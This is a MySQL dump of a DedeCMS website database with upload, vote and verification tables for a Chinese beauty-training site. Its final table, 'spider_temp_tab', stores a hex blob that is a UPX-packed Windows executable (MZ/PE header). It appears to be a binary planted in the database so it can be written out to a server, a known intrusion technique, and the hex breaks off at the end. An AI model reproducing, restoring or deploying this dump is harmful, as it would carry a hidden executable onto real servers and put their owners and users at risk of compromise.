INSERT INTO dede_uploads VALUES ('403', '0', '150522/1-150522151224E9.jpg', '/uploads/allimg/150522/1-150522151224E9.jpg', '1', '808', '539', '0', '63835', '1432278744', '1');
INSERT INTO dede_uploads VALUES ('434', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-15052510340A42.jpg', '1', '589', '800', '0', '79821', '1432521246', '1');
INSERT INTO dede_uploads VALUES ('435', '105', '5个月 专业形象设计师培训研修班', '/uploads/allimg/150525/1-15052510341Q56.jpg', '1', '589', '800', '0', '81416', '1432521258', '1');
INSERT INTO dede_uploads VALUES ('436', '123', '韩式半永久性定妆术', '/uploads/allimg/150525/1-1505251145449D.jpg', '1', '458', '347', '0', '157144', '1432525544', '1');
INSERT INTO dede_uploads VALUES ('437', '123', '韩式半永久性定妆术', '/uploads/150525/1-15052512151RT.jpg', '1', '380', '250', '0', '121169', '1432527318', '1');
INSERT INTO dede_uploads VALUES ('438', '123', '韩式半永久性定妆术', '/uploads/allimg/150525/1-150525122P9103.jpg', '1', '516', '347', '0', '132685', '1432528089', '1');
INSERT INTO dede_uploads VALUES ('439', '123', '韩式半永久性定妆术', '/uploads/allimg/150525/1-15052512321M03.jpg', '1', '626', '347', '0', '134718', '1432528337', '1');
INSERT INTO dede_uploads VALUES ('440', '123', '韩式半永久性定妆术', '/uploads/allimg/150525/1-15052512323Y12.jpg', '1', '626', '347', '0', '134718', '1432528358', '1');
INSERT INTO dede_uploads VALUES ('441', '123', '韩式半永久性定妆术', '/uploads/allimg/150525/1-15052512360M10.jpg', '1', '626', '347', '0', '114736', '1432528567', '1');
INSERT INTO dede_uploads VALUES ('442', '123', '韩式半永久性定妆术', '/uploads/150525/1-15052513024U33.jpg', '1', '380', '250', '0', '81142', '1432530168', '1');
INSERT INTO dede_uploads VALUES ('443', '123', '韩式半永久性定妆术', '/uploads/allimg/150525/1-150525131110940.JPG', '1', '486', '719', '0', '52688', '1432530670', '1');
INSERT INTO dede_uploads VALUES ('444', '123', '韩式半永久性定妆术', '/uploads/allimg/150525/1-150525131326258.jpg', '1', '800', '785', '0', '94291', '1432530806', '1');

-- ----------------------------
-- Table structure for `dede_verifies`
-- ----------------------------
DROP TABLE IF EXISTS `dede_verifies`;
CREATE TABLE `dede_verifies` (
  `nameid` char(32) NOT NULL DEFAULT '',
  `cthash` varchar(32) NOT NULL DEFAULT '',
  `method` enum('local','official') NOT NULL DEFAULT 'official',
  `filename` varchar(254) NOT NULL DEFAULT '',
  PRIMARY KEY (`nameid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_verifies
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_vote`
-- ----------------------------
DROP TABLE IF EXISTS `dede_vote`;
CREATE TABLE `dede_vote` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `votename` varchar(50) NOT NULL DEFAULT '',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `totalcount` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ismore` tinyint(6) NOT NULL DEFAULT '0',
  `isallow` tinyint(6) NOT NULL DEFAULT '0',
  `view` tinyint(6) NOT NULL DEFAULT '0',
  `spec` int(20) unsigned NOT NULL DEFAULT '0',
  `isenable` tinyint(6) NOT NULL DEFAULT '0',
  `votenote` text,
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_vote
-- ----------------------------
INSERT INTO dede_vote VALUES ('1', '你是从哪儿得知本站的？', '1266336000', '1584547200', '0', '0', '1', '1', '0', '0', '<v:note id=\"1\" count=\"1\">朋友介绍</v:note>rn<v:note id=\"2\" count=\"0\">门户网站的搜索引擎</v:note>rn<v:note id=\"3\" count=\"2\">Google或百度搜索</v:note>rn<v:note id=\"4\" count=\"2\">别的网站上的链接</v:note>rn<v:note id=\"5\" count=\"1\">其它途径</v:note>rn');

-- ----------------------------
-- Table structure for `dede_vote_member`
-- ----------------------------
DROP TABLE IF EXISTS `dede_vote_member`;
CREATE TABLE `dede_vote_member` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `voteid` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` varchar(50) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_vote_member
-- ----------------------------

-- ----------------------------
-- Table structure for `spider_temp_tab`
-- ----------------------------
DROP TABLE IF EXISTS `spider_temp_tab`;
CREATE TABLE `spider_temp_tab` (
  `spider` blob
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of spider_temp_tab
-- ----------------------------
INSERT INTO spider_temp_tab VALUES (0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000009BBB9A02DFDAF451DFDAF451DFDAF451A4C6F851DDDAF4515CC6FA51CBDAF45137C5FE518BDAF451DFDAF451DCDAF451BDC5E751DADAF451DFDAF55184DAF45137C5FF51DCDAF45137C5F051DEDAF45152696368DFDAF4510000000000000000504500004C010300B2976A460000000000000000E0000E210B01060000500000001000000090000010E6000000A0000000F000000000001000100000000200000400000000000000040000000000000000000100001000000000000002000000000010000010000000001000001000000000000010000000D8F000007400000000F00000D80000000000000000000000000000000000000000000000000000004CF100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000900000001000000000000000040000000000000000000000000000800000E055505831000000000050000000A000000048000000040000000000000000000000000000400000E055505832000000000010000000F0000000020000004C0000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000322E303200555058210D09020A459475C59FCC587632C900000F46000000B00000260A00BC6FEDDDFF558BEC6AFF6800007148040ED064A10507506489FFD8FF9F2583EC0C5356578965E8C745FC0F7D0C0175236A00FFEDB77B012E05B008FF150970008945E4EB09B81E7363BB0124C38B2FFF000F8B4DF05FF6FFD94E0D5F5E5B8BE55DC20C0090008B442499ACFDF604C740081C100432C0C30F8F58FDAC7D0081EC8C090592C685E8FBFF77DFBD6100B9FF1733C08DBDE90DF3AB66ABAA33DB895DFC8B33DBBBFF450C8338010F85770380480439190A6C53EFFEFFBF80988B50088B0250E80A005DDC83C40885C00F84511A889DC8F6F720276B414EC9F6C785BC0A9FD9DC5D0C16899DC0090FC4D853A1FBF6DF8D8D1A518D95CCFA06528D85B80D500EB399661B2C256C44246CCDF7EFB116288B852A8985ACF605A866EEEE8C6C559C985668050134776723CD95C852240CBFBA8883C9DFDCFFB7FF9CF2AEF7D12BF98BF78BFA8BD1100E4F8BCAC1B3CDFDF6E902F3A50683E103F3A4FBF2083566B604D88B393284B4C1B5DB60E6D8FBB153006A0103FF6B63838A538B20B4283BC3752D6A0A6D84436EF0E8FB1C4F473ADBAF3D7C12516670380B52E917059E0B67B30CF72A18B9D0FA40FB0E72106AD1FA6803FA8D1D93CBD8D84268FF14D0FAC47E0990583A548D64D9BA6F3EE5117E8BF089B564B9535EC803C2993B046AA18BB810CD2ED81B0E567420C63C10FFB9E53B72C6000163E8EBBA1882FBB7B9850436D41105B0596A206A03049D306B6E037D7EB2BF0CF6B171F37B6883FEFF6A85385618DCEFEF2D94F889BD408D4764A80FF652F1DC2F942DB9590C89036A9D5679F8CFBE564F01515030108B13C6043A0009446C03E40BD18B3BD9687E2C089318580C04EB366A64B66C8DC972D031745813594ECE0E53C16551C83BE920FDC91E498B5514890AE98B03E63F61EE23C368C80B6389500C3BD37C2939D8751A3233C07F3001BB709155357A0C83910DBB954511420C8651C8D391AC91AE8D513763F24C9552CDB0069B6CC2A4E96551C51C8B6C76695D530C1FA86CB243C27B0C298B5BA5C3A71B4F08A40F8B400C8674DD5B768C07BC91591B00130BC8AEF1B72C1D750683C8FFC2C30E05DCC030D74E060C74092FF202EDB4329054554468020217F6FEBFFE7134F7D81BC04081C41A5E903D814C060F6808B8640426B073A466121C866DCBB6417B885DA87401A902ADB17EE3D2B76603B58845B71684FEF1888590FFFE7D72BB06563F84BD910AE983CF3F4F9B2E347D942C6A02227175943B5A018CEDF7751616FC1708EC3F79044888FEFE71103BC7751D560A1BC60B6C14326A107A8D74235F61B8E73A52180F66DB8D2C2C88980B531CAE9A338FCA02DD827A1D0E203DB8C9B537DC9004B9827E8B3089CAB4D6D37CB01D80B471D337110CE748BEDDEC6F6A081AA8D177E6489E04A0B6138D55A8E327325A00438D7DA883CE2D656B0763CE457537E59B512FD8B7C1028B8B8596504522D9BE1B6144418D4DA885C977DD1696139C2E06249C238D472834160750D28954283B70800CF2C67526537547C84B6CC025CF070D048CFFFEDF5EBC8549E4200866E4516A28AE11DB6E61BC52F88D2072229D489AB3985D2C1D8B35781C88D11B302A6C37DF5968311659FFFF1151BE82B96D42D6FC84FED51052D985CD06A5091CEBC5BA94506052022C069E0F3981C511788FA404FCF68450228B75087CC0807E09060A4B775B71A85F8B5E0C20D469D9D115CEF92011C8B80D124CB6177EA98AB6E00FC1E0028BC803C604C468141ADF02CC33C98A7DBFB566FBEF5E4CC1E102058D14018955E0803A4D4F586F8F818BB9AA01CC8BF2E266F3A7ED0CF26C164102C0159D0542D875477205B04C2C3908C10D00DA6E0D67EF1968D007001034E90B8795BC59C82DED1533F607B80774C03FFB9009C183C206298A023C2167DF7FE9743C843B1B3C0A741788843530421B46D889846744EBDB7FB907CABBFF6F29B6B53C33D2F3A6753B88954C0BB918D962C860784DB34C76739038C0B10B6C68E803C59378271EEB254A1D8E236534B0301BB135728144C60F4F9400D7493C77C7030B5E382E81D8BB7F1A837C2410027513060405750C5B6464046B5F23C357084F179213C888140525F1ECA263810C5456C9134CD8C9C22CBD4FE485DBCEE499566BF6CFE0FA8BCB2BCE490C0804904BB80768042700E0FE397221F724434558E0FE8108D87B96002F8BFB1B2A2327837CD98BFACBCB5073BCC8855098E0FE8D6FBFAC03B7B10DCC63DC0DAF234B21D18DC47AF02AFA7A568F638FA2C0EB0C0354AD46F2C505EED48821B01A60A081C4112684C3CFF4425689FF3B77D77857040CB911280D108D7C2418F3AB8D4C243B0D069B6C1451AB343101BA0B041B0111E5724E64F06650720D553D8755FD04BA917466380E6E8D542408D731F62D925266181108435C5C8F4F4A761850514F9481106A5CDFBFEACC4044076C1589B424809674C67652DD247C03788C5FB65E56B87B49BCBFF0FF255B3CCCCC8D87D4E1674755E7F0FF42DF86C00D5F613C5D6C7904F74104868B23B8065423740F795CEFDCD7B7A5108902B863C33E1210506AFE5C908E7F40F864FF35A900198E1AB52529582FDDD5B4BFC0ED742E3B932474FA34768B0CB38959BD2DB50A02C304B394751268F7DBBFEDBD2DB37D0EAAFF5408EBC3648F0543236C7286EA8C1A648B9C8184FF83DF7904687510E3520C3951087505CF4D05BBFB5351BB1E18EB0A082489DFDCB7B64B02439D6B0C595BFCEF56433230069F0BF758433030F7A5FAFCD82C10DBD10C74F740E42682B58DD63E3F45F812E11B8D08B67F97AD3E21737B08C1618D0C76B18FEA6EED5F744556558D6B10A80B5D5E410B33BBE85ED633783C25534F0DD41D2B38D3AF560C0E168D36B7DEDDB6C5648F358F550C3B08C77EBF73301A8B348FEBA1B8DBEB1CC9EB15884DD67A5C003F5D16466F684394BC3B8B298B419FCC256BB4031824E1D763D9B66E20CF56BDE8C0E010E24785ED75EC423C0AE0DD5B0D1A7E4DE47F34168D5AFF3ADD766B1B92784D1C8020770D2450EDC3FF4884157559598BC65EC9C3CF8DDCFAF7D7B26B71151008C3B7E0772212C7424B4F0434A759913916BDF01C6C7410131E97DEB2C3568BB5FB05D7383B42565777216A091C1FF8ECA245FBA424020C91EF2059E1DB46ED38CEC7FD85F675032863FCDA7F5E83C60F83E6F056887CA4BCC65CE23B3A6BFC4D5716F6460C4074ECEFB75D15660CB2174D29730510B35652F790357329C54E308374342411FAFEE42B502AF7FF761007176F9B34F5DD7D0525EB128B461C530B5FD2A4D87B1C0059644B2A20B25628752EE34A467A86B386F62C591AE1D81E2DFA85EFFD0A7C092CE61D90280DE157F8ED397D08470F94C0485BC31630077AC31A6E5DF1025B5756391803BA23977D6097CA146A401A0CB8CDDCF7039B4DB4DD40743DFD6E78405720AC597B741356C220D7843337E11962410B5957B4C5DA2E6018CC07835328D00CBC3010E326ABA73DB884FB1147D903CB8BFEEA5A8A4614B8F01759C93A47FF7704A94949608563EF1B385B5E5FC93A00513D7DBB8B3B1C279772148111222E2D10B5B73FF685011773EC2BC88BC40C8BE18B596EB4A32D685036C10C576D747A9BF8BAEB74D9C614F7C64D8B197507F8B77803AB756FEB21F646880747497425FF6BCFBA26291F75EB2D1D5183E303740DEE5EEF66201D2F4B75F38492C3F7C79ED9E0FD2874123AFD8A116A9B3BE93AEE6C182EFA2AD1DBC2F6C82E89FEC7D074AFBAA5DB2FB523FEC70603D083F0E8C28B4F78E1BFF5C604A900948174DE84D2742C84641EF7C26FB7B7B90F580C070875C639EB18818C34DDA3E272090E00046A2BC45A88533F550A3B6CF7EBEE075F75F8B07585A3CCFFEFDE8DC6974E8A11F161698A7101DDBF2B74644F7719148A074638D07415D90BD3D2A573E30A0A75F5FC5F51E242173E10F0078D7E436102FE3B2A50DD4E1DC60238E075C48A410376EDDDEF31188A66FF83C11074DFEBB12F348AC26B74851B9030F28DBC0CC34C05C7DB88DFFC83F8F988CC078FA7DBC668BEA3068E58BEB2427EBB8EDE3CA10E680D075925DEC12DBDD1F7FB12102760891664950803C1EDDB50F3375C32F7750940EE78769BDDD8EB7256641CA4C03968098DCC7BB3D96D345204371B366231A8FF0519627F7FBBC8EB3E6B3BC1752C390D0D7EBDFF07E6FB0AFC0D8E90E128E6320E175A89D8331A64FBC25507514EADD87E11B259BF5833A569A363097D56B457C7105EBDC0D6BB09833D482926C101740547D36EA3040322DAA4C4E809F4AED9996EFFD0080CC113CC04BCB6D410BF4E0F07EB8D01C90C4C6D6FB0BB1737575023F6467926A315ED8034032125F71F0117396C115B083C5BD8B9E241C0D01A8DD4D8B1AE6176BA310E97D801DB78C041E03A9A3A3AD3C57DCD2A7D3B8130AB756C462D6C36BE025E10A882D2F6A840B9EEDAB61BED074AA96604071017DE6EBFF77F3F4E0824FE890E89462F1883657524EF0337F72D6E66A90C0115F981FE8B03BFC75A289C0748750BC03F32AE6ABFFDD7073E3EEE5966F7270801577467420BDCB65FAC3E2BF88D48390E581849A489DEB99EF04E047E10053CFE53DCEB3683FBF6CBFFDFBA198BCB8BC3C1F90583E01F8B0C8D93808D04C002B6F4B2D08196B88498F6F320F399B156A107783A260A4B2CD15C8A9E88E614B7C0C24A0D74885507DF40A12932DF4E0C20EB0FCC16B8760C7CEB080DC2C1C8A50E864C17064802DFBA95A1E6798A1F09DB8975F411BAD06E02EC890F0EF406D1B705D74A8D370641D00939554ABF7DF7EC0F8CDC1780FB207C1304787F0E0FBE50152EC08631717461EB02F8BE2DBCBB0F84C60E94C1F804A70789D00F879A85F652EC30FF24901DB2834803CBB22CDB55CC02D8E0E4FCDCBC6DBB4D5D1D954883E8E43B0403742DC1B55EA20B1F4848840DA8D2C56E6E594039FC082708041CB28C1D0111808002C3128E9EFB2AF9B9509B687613661E6CC80F8D12469B89985B8ED80E27B476CBB2ED170A666C4441D0EBE98AF03EED5C2E641EF0D305BF30E7CE63398D0489361B346FCBDB56AE2E046874206CB880FB7790495E2EA005804DFD10EEC6FFE4203F367514807F0134CA4747271FDA628680771888D0AA8568B7C6ED0D1C0FB6C3F66601802291EC50147E06131E28981DCEB0C18DCC35EB4733181652F39BE127F8670F8F1CE508650F8D9600F9EF43DB5811EBA9847817E8430F849FB96D5D836D70036C100CB8E903AF74A146C6BE3008CCC08B25430BFDF0BD68BEFACAC54BC21921D0ADAED4DEFB894DF844E7B1C92D0E2DE47EB981381229DC7477B37D212AD64E85D220D466833878869FED5DCA094040EBE721CC80C320136B1B74AB408FB8FDF3CAD14DDB955F708DCFF3F006CB1A0D8DAFF1660377862E8848BF578089043A953F5B008DD1D6C5F490323FD80C298EDDBEBDD35A7432040974C5487CE801521C97B3B345FE3A6C59882AF4471A183147BD2002BB8916359DDE6F2CF64580D9CCB97F74170FBF00D1E8E369E652D7D8C3AD2DDC000CBF0E94AE6DB4BE6E81344D50C28D8314670B2D826B25D5165C50CCA2B5AFD483C05E08F05D4B053B6C377540FC0EBCC8D18B851FB082B8F7855082FCC9C6057EB581E69E741429F0003506BE67B324205C595D12AF788432611654562D750DD0C2BB653A29BDB9E06157A758888D8459A619694899ED2C1D0C059E0684B686FB2C805184FD331B23B1CF05F77491C9C15DD4273C602621F62BC1D1F847FD340BDB0582F6288038AF03ECF1D728176B2624FE853D6B2815CC074DBB7B10D410A6FEF65D8A13C645EA3004516377CF60DF678845EBEB4821083BC202EB35D6852E09971B209909669F08CD2DF0EC668909050706F514EB0E296A403C0A69BF1FD6A05FA53A7959EB413D74218519637405404A0C0FBB641B0CF6C099EB250BB7C8F220AFC0ECC908EBE0070E19B8F5C6DB741BE37F177C1AC073115883D2D6E2C30D9FF7DA698BFAC90B1FDEE0B50577DC83E700B27D09161B2D08FD1B2AFCAA3AC0B6FBC60BC77509E40060B733D6DEADD55E614A7F0619EE0F765B5DFDF4995250578AC009C476409C5FDB6E372AC48B66C33007C017112CCBF6DF063E39677E03035DD440F8F847D75CF78818EBB5502B0C027F02A51AEE9B03611880393075A90A009BBBEB24400FC601301A98D825DEFEB1B6F4935DFCF6C3D226F6C716CF5A8386068A2D5C0F0A2BEB47369A970902740B20C1E475E06035B6ED2B75E402F4180C7884BDDB61A91B201EF0C41011CD7C37B703EA1402E45015342C9001D94C3E3104306F6B97DA893E7441058B7EFBBB0B97688E3B78FFDD034347C8502DFC54A443DE9D7E328DE9516EA164CF3B1759984FDB962DD802C7155802F4F860A50AC977AC79A5D7193808FBF97DF729B3456313F9E86DEC99D334B75BE01830031706216D30D1354DA4ACE11B7440C6126F55424F490478DC11BA6D6C74898A02FF0EB6300BB90233E098006C4E9468254A90D68C71D8A3AE4A83B557AFA9E0B06AEA7E21B618B714AB63DB43B9833E0D07207FE3B5B628B5908B5CE81A4BE6775DD73831263C1C35100FBE065746CDE7EC505F363FC34BE26D6C3C72BE9F580081008DAE0673520C083B4163B3A177D951FC1C661D6F8DE0B474E8500F41CC5204B4702D700B30027114E0550798688478EAA3365283702294BC5DF20D50600F6E85C0750F6C60A1FBCF373E5333DB391D15B4282D5DC3431B267E44D8B8013D0E74FB768AED8D700C5540785BFF36FFD70810E0916D800A6AFF7604626BC75EEAD59C14433B487CCED915DB812D1BB81D785DF6568CFDDB41DC7078158184FFD6077415CA2083644457D42DB983867CBE100A06FE2B8F3C763BD13474230774741B647413A8AE012344D398367B845CC52BDCFF007CC45A2067C106D76A07845D1003CA44F85083EAC716DE3C856C6C3407753E576A181F3B1A1F3C8BF8D4336A113542FB8D06BC59078C08005957750ADA0E78B31F78893EEB067A1D84D9607F865F281A805E5D60FF57605AA8B11584CC40A48B4F485801B7B87501172BC5D86E2508B00006B41217B770A0FBACC70505A48BBDA118AD96AFC18DB107B88858F0E16FC47314B5042B500C81FAB27207DB210C6FBB14EBE8EC321C556E34D5880C2E6A41DEF22BA3DF60A36A5AAFC2FC57C1EE7F37AA817FCE8B7AFC69C904D24B448D8C8E1A35C50144695D695685463BF80C13F6C1012E757FFDF4B46FFAED3F495F0B0C3BCF76038E8B4C13043B03BFF84D4BF4486783F920731CBF2CD3EFBFFB5FE88D4C01C4D7217CB044FE09752B752139EB2483C1EEC15CB0E01E2D21BCB0C4124AAEF174240679F04D42ADB519DB55890A040803630DDAD6FEBB088C8BFBC1FF044F83FF3F7B865F2F5167A8DBBDE197ECC4422BE20562AEA711A188F8495ADB5AF7E6A464760589F3CA411BFB40ED56E09F3E3BFA76028ABF746B2E9101DB4C69BE51BDBA16B9E491EAD22154111E96900F0BBDD221944C72B66DB152BF49BE4A0B04658BD6CA0811910EECB610F9D40939B68900B2F9295B73DD1B0B26892F0E05087FFB652B974A638A4C0704EF20884D0FFEC1FDEBE2BB880B7325807D0F55BB888BCFD3EBD81A25DB7609190DECB109B10BC436592924DC4FE019D821B8672559040F9D84B7F0DFC0F009388B54D0891A895C13FCFF086BAA0FB348FA4EB09CDFA6AFFFACEE0D0DA80EC1E10F03480CBB03B159E9581653513A1F32068B3D081C0950080E3940DDCDDE0D31A4886C570FFE48431C7BC39F0A481080794313836004FE118378D65AA61D106C5310785A124642882D0910C9F48D72F5388B15F21430C1C2B146DA282BC892110AD307BE708D48145170411C6D428DF767FA85B43B05223518BFEEEFD81496B88905ACEB0324A3AC8935B0493138532A6627F7AE142F68578D3C822C1B8E0ED3C6481776F0176A4934000B6FD57D0E56D3EE83EDFFEE0BE0B899EB1026BE33F6D3E80EC62D3E173049AC0F3BDF7FBF5D58E20873E14BE13B232B23FE0BCF75DDAE718B0B24143B9A1872E707756D26E4FB798BDA3BD8261505EBE6740BD7A019AC24C2837B3C3BD72A68891337EBED2681397B870D1B2FEEDBC8DC7646270B7B85DB90530E61DBE2F6BC595B1089FA43A8386C75EF6E6B071BE91406891DA5148B886F0BB016FAFEFC2D8B8C90C4B6B387FDAD904488378B127011557DA1A156DD1F000E440BD68B563077BF0B75178B91841CFF45FC04BF35EBA6FFFE23390BD774E98B97CA33FF5C5A741B87584D764C57CEE68DBA12C166EC645F9DBAED0AFD7C05D1E147EB752054F9430A2BE956EFEA7FF17BC1FE044EDE3F7EF83AC9DCB85E3BF79B0D0124617421206D207D2B11A27C383AEEFEB69CD3F3EC235C88448903FE0F75EA08B181F48E7B210BEB31172B5CBBC56895A1322119293673148215982C85220AA6D76593C07A04F80095AF3F4735D77A089084C5A97CF10348AD6D420CA522C264A974B32C06FE0B7D29C499C636576A0B331162BFB0CE6EBB64978C093B0A8F097CAEEB2FEF437AC0280D8D4EB6097B04B15C8F74B1BCAD16BEEE09376A2EB7F4AEF70B890A8903FCB2790DBFED56AE03D122011232FC9F8B34126FB70E218D790F3E751AA9B0A011A92BDC4B3BA406A49772C16B119C8D420408A1C41769A10220A489C09A6E6D44B6305F89507250D401E924E15797903B319841A10B889CC0930BF8653DB868C4411B45CBD81233305C81335C89834517F04610742A1B20655783363A63198CB014BDA5461C586460B47CB1856EAD4E24C5897E060562244A196A41B98BC36E74F1E051DF3771C84108343B5A2DDCC54FE043C331B63E6E3769C0815AFB3082C3026CB745EA40080204DE4A1E88D0AD5BFB85C1E7DF790C47A68686BDE88B3B08D13768ED4D2728B28D97101342773C47834BDB8D477748F283887EF4368379778D88FC06C740FCF0420EEFD0E77E01C24804C780E810140517EA0D7E3B48F09676C78B744F0CEDADFBC405F8FC015F2689AC8D4A0C087FB8BD6C8F41649E4442BC9EE38A46438A6F75D78DC80B84C07A884E43A30978047050608CBA2CCB687EA5266189BDC3ABA031BEAB17B614AB5ECCB80002BD063BC67D07EE07DA5BA319DB134451590D8DB535C5949808211256F4A0FA648B9018E21A33C9B874EBB7193D601519890476C020D46CEFC0D50884887CEA1CBA187C8A05A09A5BFE1134B5E055539F8B04865274C3F02F5E586F0A20C220418D82787CD1AD76BBA8A29BAC80448E8C458D3746DD05E97ADEE9B96A61A796EDDF72175F6877102B56F8C03B75466E436659C37CD780A065A52718F8141E1E722A5B76E9225120592139250384205934F449A884E2948073382CC6A1FE435607F644810401741D57A86F7264B348442A7448A3FCC6CF50E245D2C775C00ADB83F4E16C668AE85C39023A3E046A9095C4166A02CBDD6BC416264B1F593BC71C196610672B59CD696F29DA19821C24DFFF1D0A05DCDB4783A383E61FF3EF8A0635FAC7A40CF68064880400C60851AE70BF7F5F597D0FC1768182434EA883C3A8FC63B4B42A197808CA6681660CF7FB3360DBD2525E06900802042A635FC5A8648605C2F6FD1FE5EA460D409C6C48C5F7D8595E1B4B5F015E991B2E0C8957FBF609705C8080F9D53766A908E0B36F1368317B907E2657503BBFADE0401BD00E8B8074DC0DB4EB0E24FD07EB072483CBFF30351A9B81EF8B5FF6F5C154F85CC185B5ACF1279788D15A63F90E7A593917EDF118D97E74A1BBFFCDA30AA57A745FF6401D32AAC18561ECA218591A8517DFBB806DC11830AF01750F505222BC80D608851D37C597B58E4A50FF028B1A7536B654EC020BF841CEB04FF44A9DE370EC463B737C8CB1423914D98487B70160C37402FB5B36E42806FDA08A7477A50538839E890BA9639456E1A05FD68E48A06017858ED552908E4C6B80C4EAAF3109BB47752053951FDA5B57F7079E8D4614759F0658A54A340BA518EB56044261DBB65E097E123E0704C53F7CD5E1EE02115B5F5B5E95DD0001C3A150DC9BBA831B0B3F6116D080660DEE6118962668025B6C02664959538926F4317D0FAF7D10012334068B5B078BDF3C2E9A45D7CE0AA8AE74157E457AFB96A27C4014A78B7781E10868B1ABEDE67429191174229580AB1616697212F863F186A53FA9495C297E393EF62BDF017D321EBC6CD046147246CD63DA56A250177A4E74D391EDADDDBBD2F76B402BFAEB42FBE3F66B1935744701982BD83F1A608976723EB00729D10F234482252450E9D42E4AE0BE169FA44BA586D8080CF1A7264385F0385DD08157106F6A23B633A465C72B7483E7FE545B3CCF56C179148A0141CEF06CA387400E75F1B3ED814975AA01605E2CDD0623955CE88AFC2B32B9A7BA51C724A95E1306B6F57EA30719EBCD8D41FF559CC309824C32C9FEFDFCD126301C8687398FA4DF221A7A0BD2F86E8A073C61051BB4F4741A3C727C3CCC22BFD1D675FE0192EB20C99601EB08B909786157731209405A8A1D473AC31DB46DB6B5E33BD307DB60BEF652DB85C016547F3E601A2B74450475DBD6F21974360E61484CAC1F39FF2C98AD6108A328FC83C920EBB72F7D2063148E10EBA22240757D0BA54D6F0940EB982C7573E993E6006EA0B7FC0F0281CE0DEB82B8BA7D5C782AC8860BC834DB656274BE8BB60DCB2E070B42067540F6C5B6B7D8B7C73B80CD401E63F8752E5FF89315FE0A37E6FFBF9B16175DECD521CE84163A741DD9621B8DD20B418068A4D71362C3242210EA4C917EA9543C7DC4103BCB7D701A2C68DB12B73A896A89588018040859334A6C021C82005196FB871825A0590F8E9D7855AE209F1F3BC374377521509175ACB30D1BB16D14501D16E97FEBC4EBBA3CB1EB446A38C1E602C23268066B62600E56063A65306C327A7815DE4B1B96B3273CFB384F108C5F58DB56B604020CBF1F041C7EA1819D355975CC00D885F6E36DFF118DA424AB8D6406075AD5AA838AE5531FE0FEC7780B3708F7C2DB138A0A4238D974D18437EACF9683511275ED0BD857FBE310281E4BB5560893BFE5F8F18D6E5D33CB0365F983F1FFF0CF33BF3F4A3770C204EEF3751C250674D37F51D83AC508C1B475C45E357E0B5A808C8B42FC38D867A67BD33713EF38DC742717E7C1E81012157BD66E9ADC06D4EB962DB142FE377A38279D06FDFC0494C36B20EE5002FFD0371404E634449EEF32AC0E0400F3C3F32CC015505431F5DF64B1025F0E57299A11FC45438A3999947511064E18C1096C987394302FFE36C50C00E714892290881DC2F5115EDF753C8690D7C58C568D71E2EE112F52F07213AC9A83EE04883CDFC7349073ED5E972018AD20CF57A1102824851B7B7F8D5BC50BA35FC3816A9480BC60711B88116A0DEC08B25DB038E194D7730D70F6B55660C6FB6A192A6339BBB1C935A4F6C08490546A74E2A0D18E50ED8BF06B7875239F5A93565B8490A04018A50A8CFD37333859109C0462BF193868305333528CA116131E782F690E182FD118D1D80D41C3BB505244A06D10F00653BE5660368B9464F20D1CD94730B00D3F8A26684BC9911588EB227536D99B1059ACF545305BC392D09113D0022FDB610D506E746CF12499906D19450D283009999009384098EC9D9044503DEE10560B0EECA4FC00CA5E4F16D4E81A48506896046AD2546CF4691B8DA62874879FD9942100DE784F9B862947731E8085F74FECDD0EFF8BC646050AA127E253F4A8DF24051FEBDE784B518CBAC46620EA001F5B9B86281ABBC6388DD98DDD02AE1A81EA7D0851F8BAB787897C79E3677D56BE4C84983D04CB930D83839A1F6B556AC082C1731C806008F6D6A55960408B0E882481C1806DF5CC31E06D4D7CB76E8B130D1588092ACE4C3B04BCB1508BAAF926388A03BE126DB4BE32527572AABC04ACA41A4123404AFD37E0487D8B0989088A0B88488F05BE558B0AFC3BF77CB485016FF04E5B23333C81FFFDAD50BA3C754D290E2F75056AF658EB099B09BA92C348C397F50DC96E1BD0B84AFF7A175770340A9D800C5B0A25C1068D1B9906804BA40FEFB6700D540A0A700405804383FB6130F2E1037C97B89480B40638B491DEBE7B5E375778A8F0056E4673218D70837BFC00FB7DC26DAC0B7C2083C79683C324C8D00CBA2072E2854824720F338825B85473C487A01D94885B155434811237F8D58DCC6B8A069ED218A996783C3D74A756FA8DC26D4B140AC3E8F9BD581D3F9EF1C63B3BF3318E74410955BF1D267B41381F74395583D8ED8F348BE85945803F49225534521DBBCC54C02E579D4F6C67C4BEFD9A5903FD3775C95DFF84C28934C768BF1D0B891EAE9484015BA2BBB25983BDBE8A98994FC1A75456530DC0A15A84E38FA2848BFE3818747463A5FA7DA307FC5053539F37B4040B0CDB05C90488D486186DD8A46BD6A1082F2700C34A7424864635A6A08D355F485A6C9C9232B1458A68B14C18D147EFF317208321008B7510C700B50156B0802BEF4937A05BFFDFA0AE80382275448A5001